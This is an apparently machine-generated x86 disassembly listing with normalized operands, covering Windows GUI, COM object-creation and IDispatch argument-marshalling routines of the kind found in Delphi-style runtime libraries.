mov edx [ r-xdata ]
call sub_404808
lea ebx [ ebp - 0x4 ]
xor eax eax
push ebp
push sub_455a36
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
mov [ eax + 0x58 ] 0x0
mov eax [ ebx ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
mov eax [ ebp - 0x30 ]
test eax eax
jle r-xdata
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
mov eax [ ebx ]
call sub_455418
xor ecx ecx
mov edx eax
mov eax [ ebx ]
call sub_455220
jmp r-xdata
call sub_44b8e8
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_455a3d
lea eax [ ebp - 0x90 ]
mov edx 0x2
call sub_403ec0
lea eax [ ebp - 0x60 ]
mov edx [ r-xdata ]
call sub_4048cc
retn
lea eax [ ebp - 0xc ]
mov dl 0x1
call sub_4339b8
call sub_452f30
mov edx [ ebx ]
cmp eax [ edx + 0x60 ]
jne r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov [ ebp - 0x60 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x58 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x54 ] eax
call sub_455450
add [ ebp - 0x54 ] eax
mov eax [ rw-data ]
call sub_4522f4
mov [ ebp - 0x50 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x5c ]
mov [ ebp - 0x4c ] eax
lea edx [ ebp - 0x80 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_434aac
lea esi [ ebp - 0x80 ]
lea edi [ ebp - 0x48 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x14 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
mov eax [ ebx ]
mov esi [ eax + 0x60 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4032f0
test al al
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
jmp r-xdata
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
sub eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x48 ]
push eax
call OffsetRect
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0xc ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_434c50
mov eax [ ebp - 0x88 ]
mov [ ebp - 0x38 ] eax
mov eax [ ebp - 0x84 ]
mov [ ebp - 0x34 ] eax
lea edx [ ebp - 0x90 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_452ef8
mov eax [ ebp - 0x90 ]
lea edx [ ebp - 0x8c ]
call sub_43222c
mov edx [ ebp - 0x8c ]
lea eax [ ebp - 0x28 ]
call sub_403f34
xor eax eax
mov [ ebp - 0x30 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x74 ]
mov [ ebp - 0x2c ] eax
mov eax [ rw-data ]
mov [ ebp - 0x5c ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
lea eax [ ebp - 0x60 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
xor ecx ecx
mov edx 0xb030
call sub_4362b4
test eax eax
sete [ ebp - 0x1d ]
cmp [ ebp - 0x1d ] 0x0
je r-xdata
cmp [ esi + 0x190 ] 0x0
je r-xdata
cmp [ ebp - 0x1d ] 0x0
je r-xdata
mov eax [ ebx ]
cmp [ eax + 0x132 ] 0x0
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
mov eax [ esi + 0x190 ]
push eax
call ClientToScreen
xor eax eax
jmp r-xdata
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
jne r-xdata
lea eax [ ebp - 0x60 ]
push eax
lea ecx [ ebp - 0x1d ]
lea edx [ ebp - 0x28 ]
mov esi [ ebx ]
mov eax [ esi + 0x134 ]
call [ esi + 0x130 ]
mov edx [ ebx ]
mov [ edx + 0x58 ] al
mov eax [ ebx ]
cmp [ eax + 0x58 ] 0x0
je r-xdata
mov al 0x1
cmp [ ebp - 0x28 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x5c ]
call sub_4555a4
pop ecx
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov dl [ eax + 0x5f ]
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ ebp - 0x28 ]
mov edx [ ebp - 0x50 ]
mov esi [ eax ]
call [ esi + 0xd8 ]
mov eax [ ebp - 0x54 ]
push eax
mov eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
call OffsetRect
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov si 0xffc8
call sub_403360
test al al
je r-xdata
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0x48 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_434c24
mov eax [ ebx ]
mov edx [ ebp - 0x88 ]
mov [ eax + 0x64 ] edx
mov edx [ ebp - 0x84 ]
mov [ eax + 0x68 ] edx
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0x40 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_434c24
mov eax [ ebx ]
mov edx [ ebp - 0x88 ]
mov [ eax + 0x6c ] edx
mov edx [ ebp - 0x84 ]
mov [ eax + 0x70 ] edx
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov edx [ ebp - 0x4c ]
call sub_4352ac
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ ebp - 0x28 ]
lea edx [ ebp - 0x70 ]
mov esi [ eax ]
call [ esi + 0xd4 ]
call sub_453044
mov eax [ ebp - 0x30 ]
test eax eax
jle r-xdata
push ebp
mov eax [ ebp - 0x28 ]
call sub_455604
pop ecx
add eax 0x5
sub [ ebp - 0x70 ] eax
sub [ ebp - 0x68 ] eax
mov cl 0x1
mov edx [ ebp - 0x2c ]
mov eax [ ebx ]
call sub_455220
jmp r-xdata
xor ecx ecx
mov edx eax
mov eax [ ebx ]
call sub_455220
jmp r-xdata
sub_455a44
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ rw-data ]
mov ebx [ eax + 0x68 ]
test ebx ebx
je r-xdata
mov eax edi
mov edx [ esi + 0x50 ]
call sub_403ef0
cmp [ ebx + 0x23c ] 0x0
je r-xdata
mov eax edi
mov edx [ ebx + 0x23c ]
call sub_403ef0
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_455a80
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx ecx
mov [ esp ] edx
mov esi eax
mov eax [ rw-data ]
mov edi [ eax + 0x6c ]
test edi edi
je r-xdata
mov ebp [ esi + 0x44 ]
cmp edi ebp
je r-xdata
push ebx
xor ecx ecx
mov edx [ esp + 0x4 ]
mov eax edi
call sub_4362b4
dec eax
je r-xdata
xor eax eax
jmp r-xdata
test ebp ebp
je r-xdata
mov al 0x1
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x0
jne r-xdata
push ebx
xor ecx ecx
mov edx [ esp + 0x4 ]
mov eax ebp
call sub_4362b4
dec eax
je r-xdata
mov al [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4032f0
test al al
je r-xdata
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ ebx + 0x60 ] 0x0
je r-xdata
cmp [ ebx + 0x42 ] 0x0
setne dl
mov eax ebx
call sub_4416d8
sub_455b10
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0xc2 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0xc4 ]
call [ ebx + 0xc0 ]
sub_455b38
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0xca ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0xcc ]
call [ ebx + 0xc8 ]
sub_455bdc
add [ eax ] eax
add [ eax ] al
pushfd
inc ebp
add [ ebx + ebx + 0x43 ] cl
add [ eax ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_455c3f
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_455c46
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_44b694
mov eax sub_44b914
call sub_41664c
mov eax [ rw-data ]
push eax
call CloseHandle
sub_455e58
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx esi
call sub_403ef0
mov eax [ ebx ]
call sub_408340
mov esi eax
jmp r-xdata
mov eax [ ebx ]
call sub_40415c
test eax eax
jle r-xdata
pop esi
pop ebx
retn
mov al [ esi ]
sub al 0x21
jb r-xdata
mov eax [ ebx ]
call sub_40435c
mov edx esi
sub edx eax
mov eax ebx
call sub_4044e8
mov eax [ ebx ]
call sub_408340
mov esi eax
sub al 0xd
je r-xdata
sub_455ea8
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ebx
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov esi [ ebp + 0xc ]
xor eax eax
push ebp
push sub_455f4f
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
mov edx edi
call sub_403f34
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
add esp 0xfffffff0
call sub_403470
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
xor edx edx
mov eax ebx
call sub_40b5b0
mov [ ebx + 0xc ] esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_455f56
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_403ec0
retn
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_40ac1c
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405c20
mov edx [ ebp - 0xc ]
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0x0
lea ecx [ ebp - 0x14 ]
lea eax [ ebp - 0x8 ]
call sub_408b84
sub_455f56
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
call sub_4034c8
pop [ fs : 0x0 ]
add esp 0xc
sub_455f78
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_455fea
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_455e58
mov ecx [ ebp - 0x4 ]
xor edx edx
mov eax edi
call sub_455ea8
lea eax [ edi + 0x10 ]
mov edx [ ebp + 0x10 ]
call sub_403ef0
lea eax [ edi + 0x14 ]
mov edx [ ebp + 0xc ]
call sub_403ef0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_455ff1
lea eax [ ebp - 0x4 ]
call sub_403e9c
retn
add esp 0xfffffff0
call sub_403470
sub_455ff1
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x10
call sub_4034c8
pop [ fs : 0x0 ]
add esp 0xc
sub_456044
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
push esp
push ebx
call StringFromCLSID
call sub_45602c
mov eax esi
mov edx [ esp ]
call sub_4040c4
mov eax [ esp ]
push eax
call CoTaskMemFree
pop edx
pop esi
pop ebx
retn
sub_456070
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
push esp
push ebx
call ProgIDFromCLSID
call sub_45602c
mov eax esi
mov edx [ esp ]
call sub_4040c4
mov eax [ esp ]
push eax
call CoTaskMemFree
pop edx
pop esi
pop ebx
retn
sub_45609c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_40575c
push eax
push r-xdata
push 0x5
push 0x0
push ebx
call CoCreateInstance
call sub_45602c
pop esi
pop ebx
retn
sub_4560d4
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x44 ] ebx
mov [ ebp - 0x48 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
call sub_404808
xor eax eax
push ebp
push sub_456218
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
lea eax [ ebp - 0x20 ]
xor ecx ecx
mov edx 0x10
call sub_402b78
mov eax ebx
call sub_4046d8
mov [ ebp - 0x1c ] eax
push esi
push edi
mov esi r-xdata
lea edi [ ebp - 0x30 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
lea eax [ ebp - 0x30 ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0xc ]
call sub_40575c
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax ebx
call sub_4046e8
test eax eax
jle r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4e0
call sub_4038d8
mov ebx 0x15
mov [ ebp - 0x4 ] 0x10
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
call GetComputerNameA
test eax eax
je r-xdata
mov ebx 0x10
jmp r-xdata
lea eax [ ebp - 0x44 ]
mov edx ebx
call sub_404124
mov eax [ ebp - 0x44 ]
push eax
lea eax [ ebp - 0x48 ]
lea edx [ ebp - 0x40 ]
mov ecx 0x10
call sub_40410c
mov eax [ ebp - 0x48 ]
pop edx
call sub_407d30
test eax eax
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea eax [ ebp - 0x20 ]
push eax
push ebx
push 0x0
push esi
call [ rw-data ]
call sub_45602c
mov eax [ ebp - 0x8 ]
call sub_45602c
mov eax edi
mov edx [ ebp - 0xc ]
call sub_405774
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45621f
lea eax [ ebp - 0x48 ]
mov edx 0x2
call sub_403ec0
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
call sub_4048cc
retn
mov ebx 0x15
jmp r-xdata
sub_456238
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_4562c4
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebx ] eax
lea eax [ ebp - 0x8 ]
call sub_40575c
push eax
push r-xdata
push esi
mov eax [ esi ]
call [ eax ]
call sub_41402c
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4562cb
lea eax [ ebp - 0xc ]
call sub_40575c
lea eax [ ebp - 0x8 ]
call sub_40575c
retn
lea eax [ ebp - 0xc ]
call sub_40575c
push eax
push edi
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
call sub_41402c
test al al
je r-xdata
push ebx
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
sub_4562e4
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push j_sub_4038a0#9
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45637d
lea eax [ ebp - 0x8 ]
call sub_40575c
lea eax [ ebp - 0x4 ]
call sub_40575c
retn
lea eax [ ebp - 0x4 ]
call sub_40575c
push eax
push r-xdata
push esi
mov eax [ esi ]
call [ eax ]
call sub_41402c
test al al
je r-xdata
lea eax [ ebp - 0x8 ]
call sub_40575c
push eax
push edi
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
call sub_41402c
test al al
je r-xdata
mov eax [ ebx ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
call sub_41402c
test al al
je r-xdata
xor eax eax
mov [ ebx ] eax
sub_456394
push ebx
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
sub_456496
add [ eax ] al
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_456588
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x4 ]
call sub_40575c
push eax
push 0x0
call GetErrorInfo
test eax eax
jne r-xdata
push esi
push ebx
lea eax [ ebp - 0x18 ]
mov edx [ ebp - 0x8 ]
call sub_404124
mov eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x1c ]
mov edx [ ebp - 0x10 ]
call sub_404124
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
call sub_404124
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_455f78
jmp sub_4038d8
lea eax [ ebp - 0x8 ]
call sub_40457c
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
lea eax [ ebp - 0xc ]
call sub_40457c
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
lea eax [ ebp - 0x10 ]
call sub_40457c
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x1c ]
sub_456558
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45658f
lea eax [ ebp - 0x20 ]
mov edx 0x3
call sub_403ec0
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_404594
lea eax [ ebp - 0x4 ]
call sub_40575c
retn
sub_456598
push ebp
mov ebp esp
add esp 0xfffff9b0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x50 ]
mov edx [ r-xdata ]
call sub_404808
xor eax eax
push ebp
push sub_4568cb
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x10 ] eax
xor ecx ecx
push ebp
push sub_4568a8
push [ fs : ecx ]
mov [ fs : ecx ] esp
movzx edi [ esi + 0x1 ]
cmp edi 0x40
jle r-xdata
test edi edi
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4e0
call sub_4038d8
lea eax [ ebp - 0x650 ]
mov [ ebp - 0x30 ] eax
mov eax [ ebp - 0x8 ]
add eax 0x4
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x28 ] edi
xor eax eax
mov al [ esi + 0x2 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
xor eax eax
mov al [ esi ]
cmp eax 0x4
jne r-xdata
mov eax [ ebp + 0xc ]
mov [ ebp - 0x14 ] eax
mov eax edi
add eax eax
lea eax [ ebp + eax * 8 - 0x650 ]
mov [ ebp - 0x18 ] eax
xor ebx ebx
cmp eax 0x1
jne r-xdata
mov ecx [ ebp - 0x650 ]
and ecx 0xfff
cmp ecx 0x9
jne r-xdata
cmp [ ebp - 0xc ] 0x48
jne r-xdata
mov eax [ ebp - 0x18 ]
mov [ eax ] 0xa
mov eax [ ebp - 0x18 ]
mov [ eax + 0x8 ] 0x80020004
jmp r-xdata
push 0x0
lea ecx [ ebp - 0x50 ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
lea ecx [ ebp - 0x30 ]
push ecx
push eax
push 0x0
mov eax [ rw-data ]
push eax
push edx
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
test eax eax
je r-xdata
test edi edi
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov [ ecx ] 0xfffffffd
sub [ ebp - 0x2c ] 0x4
inc [ ebp - 0x24 ]
jmp r-xdata
mov eax 0x8
test al al
je r-xdata
mov edx [ ebp - 0x10 ]
lea edx [ ebp + edx * 8 - 0x250 ]
mov [ ebp - 0x1c ] edx
test al al
je r-xdata
inc ebx
cmp edi ebx
jne r-xdata
mov ebx [ ebp - 0x10 ]
test ebx ebx
je r-xdata
lea edx [ ebp - 0x50 ]
call sub_456b78
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0xc ] 0xc
jne r-xdata
cmp [ ebp - 0xc ] 0xc
jne r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
call sub_404c68
mov edx [ ebp - 0x1c ]
mov [ edx ] eax
mov eax [ ebp - 0x1c ]
xor edx edx
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x18 ]
mov [ eax ] 0x8
mov eax [ ebp - 0x1c ]
mov eax [ eax ]
mov edx [ ebp - 0x18 ]
mov [ edx + 0x8 ] eax
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov eax [ eax ]
call sub_404c68
mov edx [ ebp - 0x1c ]
mov [ edx ] eax
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov edx [ ebp - 0x1c ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x18 ]
mov [ eax ] 0x4008
mov eax [ ebp - 0x1c ]
mov edx [ ebp - 0x18 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
sub [ ebp - 0x18 ] 0x10
mov al [ esi + ebx + 0x3 ]
mov edx eax
and dl 0x7f
and edx 0xff
mov [ ebp - 0xc ] edx
and al 0x80
cmp [ ebp - 0xc ] 0xa
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4568af
mov ebx [ ebp - 0x10 ]
test ebx ebx
je r-xdata
dec ebx
lea eax [ ebp + ebx * 8 - 0x250 ]
mov edx [ eax + 0x4 ]
test edx edx
je r-xdata
mov eax 0x3
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
mov [ eax ] edx
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov edx [ ebp - 0x18 ]
mov [ edx + 0x8 ] eax
cmp [ ebp - 0xc ] 0x5
jl r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax ] 0x100
jne r-xdata
mov eax [ ebp - 0xc ]
or eax 0x4000
mov edx [ ebp - 0x18 ]
mov [ edx ] eax
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov edx [ ebp - 0x18 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
cmp [ eax ] 0x100
jne r-xdata
add [ ebp - 0x14 ] 0x4
inc [ ebp - 0x10 ]
jmp r-xdata
retn
dec ebx
mov eax [ ebp + ebx * 8 - 0x250 ]
push eax
call SysFreeString
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
mov ecx [ eax ]
mov eax edx
mov edx eax
mov eax ecx
call sub_404c44
cmp [ ebp - 0xc ] 0x7
jg r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
mov ecx [ ebp - 0x18 ]
mov [ ecx ] edx
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x18 ]
mov [ ecx + 0x4 ] edx
mov edx [ eax + 0x8 ]
mov ecx [ ebp - 0x18 ]
mov [ ecx + 0x8 ] edx
mov eax [ eax + 0xc ]
mov edx [ ebp - 0x18 ]
mov [ edx + 0xc ] eax
add [ ebp - 0x14 ] 0xc
jmp r-xdata
mov eax [ ebp - 0x10 ]
lea eax [ ebp + eax * 8 - 0x250 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
call sub_404c68
mov edx [ ebp - 0x20 ]
mov [ edx ] eax
mov eax [ ebp - 0x20 ]
xor edx edx
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x18 ]
mov [ eax ] 0x8
mov eax [ ebp - 0x20 ]
mov eax [ eax ]
mov edx [ ebp - 0x18 ]
mov [ edx + 0x8 ] eax
inc [ ebp - 0x10 ]
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov edx eax
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov ecx 0x8
call sub_40ef6c
add [ ebp - 0x14 ] 0x4
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov edx [ ebp - 0x18 ]
mov [ edx + 0xc ] eax
sub_4568dc
push ebp
mov ebp esp
add esp 0xfffffff8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x6
lea eax [ ebp - 0x8 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b51c
call sub_4038d8
pop ecx
pop ecx
pop ebp
retn
sub_456910
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x1c ] eax
mov ebx [ ebp - 0x4 ]
xor edi edi
mov [ ebp - 0x8 ] esp
mov eax [ ebp - 0xc ]
inc eax
shl eax 0x2
sub esp eax
lea eax [ ebp - 0x10 ]
mov [ eax ] esp
mov eax [ ebp - 0xc ]
sub eax edi
mov edx [ ebp - 0x10 ]
mov ecx [ ebp - 0x18 ]
mov [ edx + eax * 4 ] ecx
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x18 ]
mov [ eax ] edx
jmp r-xdata
mov eax ebx
call sub_4084a8
mov esi eax
push 0x0
push 0x0
push esi
push ebx
push 0x0
push 0x0
call MultiByteToWideChar
inc eax
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
add eax eax
add eax 0x3
and eax 0xfffffffc
sub esp eax
lea eax [ ebp - 0x18 ]
mov [ eax ] esp
test edi edi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
call GetThreadLocale
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
push eax
mov eax [ ebp - 0x1c ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
cmp eax 0x80020006
jne r-xdata
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
push esi
push ebx
push 0x0
push 0x0
call MultiByteToWideChar
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
mov [ eax + edx * 2 - 0x2 ] 0x0
inc esi
add ebx esi
inc edi
cmp edi [ ebp - 0xc ]
jne r-xdata
call sub_45602c
push ebp
call sub_4568dc
pop ecx
jmp r-xdata
mov esp [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_456a08
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
mov ebx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
cmp [ ebx + 0x1 ] 0x40
jbe r-xdata
mov dx [ eax ]
cmp dx 0x9
jne r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4e0
call sub_4038d8
cmp dx 0x4009
jne r-xdata
mov eax [ eax + 0x8 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
call sub_4569f0
mov eax [ eax + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
lea eax [ ebp - 0x104 ]
push eax
xor ecx ecx
mov cl [ ebx + 0x2 ]
inc ecx
xor eax eax
mov al [ ebx + 0x1 ]
lea edx [ ebx + eax + 0x3 ]
mov eax [ ebp - 0x4 ]
call sub_456910
test esi esi
je r-xdata
